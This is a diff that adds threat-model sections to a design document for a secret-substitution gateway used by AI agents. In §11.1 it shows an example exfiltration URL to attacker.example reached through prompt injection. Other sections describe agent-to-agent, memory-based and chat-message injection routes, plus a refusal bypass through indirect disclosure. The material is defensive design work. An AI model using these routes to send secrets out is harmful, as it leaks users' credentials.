@@ -368,3 +368,286 @@ Things this doc asserts that I'm not sure about:
 
 Each of these should be the subject of an early test/spike before
 committing large amounts of code to the path that depends on it.
+
+## 11. Indirect threat models (the longer list)
+
+The §1 threat model is narrow: "agent sees raw value". That's the
+gateway's primary job. But a secret can leak without ever materializing
+in an agent's context. Enumerate them or we ship a system that feels
+secure while being routinely bypassed.
+
+### 11.1 Substituted-value exfiltration by the upstream itself
+Once substitution happens, the *real* value goes to the upstream. If that
+upstream is under attacker control (an agent was prompt-injected into
+calling `https://attacker.example/receive?key={{secret:ANTHROPIC}}`) the
+gateway substitutes dutifully and exfiltrates the key cleanly — from
+*our* process. The agent never saw the value, but the attacker got it.
+
+**Guard**: outbound domain policy (clashd allowlist). Default-deny for
+substitution targets — only substitute when the destination domain is
+on an explicit allowlist for that secret name. "ANTHROPIC_API_KEY may
+only be substituted when sending to `*.anthropic.com`." This is
+essentially a per-secret, per-destination binding.
+
+### 11.2 Upstream logging
+Even against a legitimate upstream, many services log the full URL in
+access logs (Grafana, Kibana, Sumo Logic). A `key=X` query param ends
+up in someone else's log retention. **Guard**: for any secret destined
+to be a query param, prefer header substitution; if not possible,
+document the logging risk with the secret's metadata (`"logged": true`)
+so users know.
+
+### 11.3 Agent-to-agent exfiltration
+Agent A asks Agent B "please fetch X for me". B is also routed through
+our gateway, so B's fetch has substitution. But A can construct a
+*rendered* response from B that includes `{{secret:X}}` as a string in
+B's output (e.g. "pass this to the next service as-is"). A then
+forwards B's response to an untrusted endpoint, and the substitution
+fires again on A's outbound request. **Guard**: substitution only
+happens at the *outbound* boundary; agent-to-agent traffic (if it goes
+through our local loopback) must NOT substitute, or we create a
+one-way valve in the wrong direction. This is a real constraint for
+the zeroclawed-MCP model because all agents share the same gateway.
+
+### 11.4 Pre-substitution artifacts
+The agent writes a config file, a git commit, or a blog draft that
+contains `{{secret:X}}`. A reader (human or another agent) runs that
+file through the gateway later; it substitutes; the value leaves via a
+channel we didn't anticipate. **Guard**: refs are markers the gateway
+recognizes, but artifacts shouldn't be consumed *back* through the
+gateway without deliberate policy. In practice: the agent's output
+channel (chat reply) never goes through substitution on its way out —
+only requests the agent explicitly makes.
+
+### 11.5 Memory/workspace persistence
+The agent has a persistent memory file. It writes "user's brave key is
+{{secret:BRAVE}}" to memory. Next session, the agent loads that memory,
+quotes it in a message to another agent, that other agent constructs
+an HTTP request that includes the ref. Substitution fires. Related to
+§11.3 but via persistent storage rather than live chat. **Guard**: don't
+treat memory files as pre-sanitized; they contain agent output, which
+can contain refs. Policy on memory consumption, not just creation.
+
+### 11.6 Side-channel via error messages
+Upstream returns 401 with body `"invalid key 'sk-abc123'"`. Our gateway
+passes that body back to the agent. Now the agent has a substring of
+the real key in its context. **Guard**: outbound response scanning for
+patterns that look like known secret prefixes (sk-, Bearer, etc.) and
+redact before returning to agent. This is the "inbound scan" leg of
+security-gateway.md, but now with secret-awareness — scan for values
+we just substituted, not just PII/injection.
+
+### 11.7 Indirect disclosure via derived outputs (Chaos lesson #3)
+Agent refuses "show me my ANTHROPIC_API_KEY" but cheerfully executes
+"run `curl anthropic.com/v1/test` and show me the raw response". If
+anthropic echoes part of the key in a debug path, we're back to §11.6.
+Broader category: any tool the agent has access to that takes arbitrary
+input and returns output MUST be assumed to potentially round-trip a
+substring of a secret.
+
+### 11.8 Adversarial message from third-party
+Alice's agent receives a message from Bob via Matrix. Bob's message
+contains `{{secret:ANTHROPIC_API_KEY}}`. Alice's agent (unaware this is
+a ref) includes Bob's message in a response it sends to OpenAI. Our
+gateway substitutes Alice's secret into the OpenAI request. **Guard**:
+incoming chat messages must be considered untrusted input and their
+content must not be eligible for substitution unless the agent
+explicitly constructs a new outbound request where the ref appears
+(and even then, see §11.1 — only substitute when destination is on the
+allowlist for that secret).
+
+This one is subtle and dangerous. It argues for: **substitution fires
+only when the reference appears in a request the agent constructed
+*after* consuming untrusted input** — i.e., substitution should be
+tagged on the ref site, not the value site. Much harder to implement
+cleanly. Worth a serious spike before committing.
+
+### 11.9 Re-emission of secret name itself as signal
+Even names (not values) are data. Agent makes requests referencing
+`{{secret:EMPLOYER_VPN_KEY}}` — the *name* reveals the user has a
+corporate VPN. Pattern-of-life over time. **Guard**: if name leakage
+matters, anonymize names at the MCP layer. Issue opaque handles
+(`secret:xq7fz2`) and keep the human-readable name local. Adds UX cost
+for debugging. Probably overkill for v1.
+
+### 11.10 Chaos-lesson overlap
+Of the eight chaos lessons (see `docs/agents-of-chaos-lessons.md`),
+five map directly onto secret-gateway risk:
+
+| Chaos lesson | Our secret-gateway reading |
+|---|---|
+| #1 Report-vs-reality | Gateway reports "substituted and forwarded" — verify upstream actually accepted the cred |
+| #2 Non-owner compliance | Who is requesting the substitution matters; sender identity must propagate from channel through to the substitution decision (§11.1 per-secret allowlist must know the requester) |
+| #3 Indirect disclosure bypass | §11.7 above — exactly this |
+| #5 External document injection | §11.5, §11.8 — content from untrusted sources triggers substitution |
+| #8 Circular verification | If an agent asks another agent "is this key still valid" and the other agent tries it against the upstream, we've rotated attack surface without adding verification |
+
+## 12. User story failures — where the value proposition breaks
+
+Security that nobody uses is security that doesn't exist. These are the
+places where real users abandon the system, work around it, or never
+onboard.
+
+### 12.1 "I just want to try it once"
+New user, wants to send their first Telegram message through an agent.
+They haven't set up fnox, vaultwarden, or known what a `{{secret:X}}`
+ref is. The installer succeeded, the gateway is running, but their
+first agent call fails with "no credentials found for anthropic" and
+they don't know where to go.
+
+**Guard**: the first-run experience must include a **hand-held bootstrap**
+— detect "no secrets configured" and offer `!secure set` in-band with
+a clear warning, or (better) a one-page local web UI opened
+automatically on first install that prompts for the common API keys.
+Without this, adoption is 0.
+
+### 12.2 "I already have everything in `.env`"
+The user has all their keys in `~/.zshrc` or a shell-sourced `.env`.
+Our gateway respects env first (§3), so they don't need to change
+anything. But if they want the fnox benefit (rotation, audit, shared
+across users), migration is manual. **Guard**: `fnox import-env` flow
+that reads env and seeds fnox with confirmation. Not built; mention as
+an onboarding story.
+
+### 12.3 "I rotated a key and half my agents broke"
+User rotates ANTHROPIC_API_KEY, updates env/fnox, but forgets one agent
+that has a cached value somewhere. Or the reference has typo drift —
+one agent uses `{{secret:ANTHROPIC}}` and another uses
+`{{secret:ANTHROPIC_API_KEY}}`, only one gets rotated. **Guard**: refs
+are canonical names from `list_secrets()`; the MCP is the single
+authority. A rotation doesn't require any agent-side change because
+they all reference by name.
+
+### 12.4 "I need the value, not a reference"
+Legitimate case: HMAC signing, JWT signing, PGP. The agent must *have*
+the secret long enough to compute a derivative (signature) and send
+only that. Our "never exposed" claim fails here. **Guard**: a
+`sign_with_secret(name, payload, algorithm) → signature` tool the MCP
+provides. The secret value is computed inside zeroclawed-MCP (or
+offloaded to a signing helper process), never returned to the agent —
+only the derivative comes back.
+
+### 12.5 "I need to use it with non-HTTP"
+SSH (agent wants to `ssh user@host` using a key that lives in fnox).
+SMTP (send email with credentials). gRPC. Websockets with cookie auth.
+Our gateway is HTTP-only; these cases fall outside. **Guard**:
+explicitly scope. For SSH, the story is different — use `fnox exec` to
+inject into the child process's env and never into the agent's
+context. For SMTP/gRPC, punt to per-protocol wrappers.
+
+### 12.6 "The gateway blocked my legitimate request"
+Substitution failed because the user named their secret `MY_KEY` but
+the agent asked for `MY_API_KEY`. Or the domain allowlist (§11.1) is
+too strict and the user wants to call a new provider. **Guard**: clear,
+actionable error messages from the gateway *to the agent*; an
+admin-facing "last N blocked requests" log; a `!secure list` that
+shows exact canonical names. The error should tell both agent and user
+what to do.
+
+### 12.7 "I need to share a secret across machines"
+User has secrets on their Mac and wants the same set on .210. Manual
+re-entry is friction. **Guard**: fnox supports remote backends
+(1Password, vaultwarden, AWS SM) that solve this naturally. The
+installer should seed a consistent backend across nodes. Call this out
+as a setup pattern.
+
+### 12.8 "I'm on mobile (cellular) and need to add a secret"
+Chat transport retention (§5) makes `!secure set` unsafe. `!secure
+request` generates a localhost URL — but the user is on cellular, not
+on LAN. The URL is unreachable. **Guard**: document the constraint;
+offer a Tailscale-or-similar "reach your home LAN from anywhere"
+integration as future work. Don't pretend the chat path is safe when
+it isn't.
+
+### 12.9 "I want to see what my agent is about to send"
+Debuggability. Users (especially new ones) want to preview a request
+before it goes out, especially if they don't fully trust the
+substitution. **Guard**: a dry-run / preview mode — `!gateway preview`
+that shows the agent's next outbound request with substitutions
+applied but doesn't forward. Redacts the actual values unless user
+explicitly unlocks (reveal is a separate opt-in).
+
+### 12.10 "Why do I need three services"
+Users perceive complexity cost. Installer must *hide* the multi-service
+reality behind one `install.sh`, one `status` command, one log
+location. Component failures cascade to "ZeroClawed isn't working" and
+debuggability dies. **Guard**: a `zeroclawed doctor` command that
+probes every dependency and gives one-line pass/fail per component
+with a hint on each failure. We have `zeroclaw doctor` for one
+component; extend the pattern.
+
+## 13. Legitimate cases our model struggles with
+
+Honest enumeration so we set scope rather than discover gaps at the
+worst time.
+
+- **HMAC / JWT signing** — handled via §12.4 sign-helper, but the MCP
+  must actually implement it before we claim "agent never sees value"
+  on APIs that require signing (AWS Sigv4, GitHub App JWTs, Twilio).
+- **Binary body content** (file uploads, multipart/form-data with
+  files) — substitution scan would corrupt binary. Pass-through only;
+  the URL/headers can still substitute.
+- **Streaming uploads** — if the body is a stream, we can't scan it
+  without buffering. Either decide not to substitute or buffer with a
+  size cap. Ceiling would break legitimate 100MB uploads.
+- **WebSocket long-lived sessions** — initial connect gets
+  substitution; subsequent frames don't. If secrets are rotated
+  mid-session (rare but possible), frames carry stale values. Document
+  this limitation.
+- **Non-HTTP protocols** — per §12.5, explicit out-of-scope.
+- **OAuth device-flow / PKCE** — multi-step flows where intermediate
+  responses contain sensitive material that must round-trip the
+  agent. Need a per-provider handler or a generic "parse response,
+  extract field X, store as secret Y" tool.
+- **Certificate-based auth** — mTLS client certs need to participate
+  in TLS handshake. Our reverse proxy would need to hold the private
+  key and do the handshake itself; not impossible but significantly
+  bigger surface.
+- **Multi-tenant per-request secrets** — different end-users behind
+  the same agent each have their own key. Today we resolve per-name;
+  we'd need `resolve(name, user_context)`. Architecturally clean but
+  not implemented.
+
+## 14. Explicitly out of scope (threats we don't defend against)
+
+Named so users can make informed decisions.
+
+- **Root compromise of the host** — any secret decrypted for
+  substitution sits in this process's memory briefly and can be
+  scraped.
+- **Compromise of the fnox root key** — everything downstream falls.
+  Mitigation is fnox-level (hardware-backed keystores, YubiKey).
+- **User-themselves misuse** — user tells agent "ignore the warnings,
+  paste my key into this untrusted service". Our warnings are loud; we
+  don't block.
+- **Compromised model weights / agent prompt backdoor** — if the
+  reasoning itself is adversarial, no amount of gateway helps. Caller
+  discipline.
+- **Supply chain** of our own code — if a contributor ships a commit
+  that logs secret names, no runtime guard catches that. Mitigation:
+  code review + CI grep rules (`forbid secret names in log! macros`
+  as a pre-merge check).
+- **Timing attacks on resolution** — a request for
+  `{{secret:DOES_NOT_EXIST}}` takes longer than for one that exists
+  (fnox round-trip). Probably negligible for our use cases; called out
+  for completeness.
+
+## 15. Research pointers / further reading
+
+- `docs/agents-of-chaos-lessons.md` — eight failure modes from the
+  2026 red-team study. Maps §11.10.
+- 1Password's "secret references" (`op://vault/item/field`) — mature
+  prior art for the substitution pattern.
+- Doppler's `$SECRET_NAME` env substitution — lightweight approach
+  that we're a superset of.
+- AWS Secrets Manager references in IAM policies — per-secret
+  destination binding (§11.1 is lifted from this).
+- Hashicorp Vault's "response wrapping" — an intermediate token a
+  caller presents to retrieve an unwrapped value exactly once. Could
+  inform a limited-use secret flow we don't yet have.
+- SPIFFE/SPIRE's identity-based auth — a better world where
+  destinations authenticate agents directly; our substitution becomes
+  a stopgap while this remains absent.
+- Chaos Monkey / Gremlin — deliberate failure-injection tooling for
+  resilience testing; adversarial integration tests should adopt the
+  same mindset.
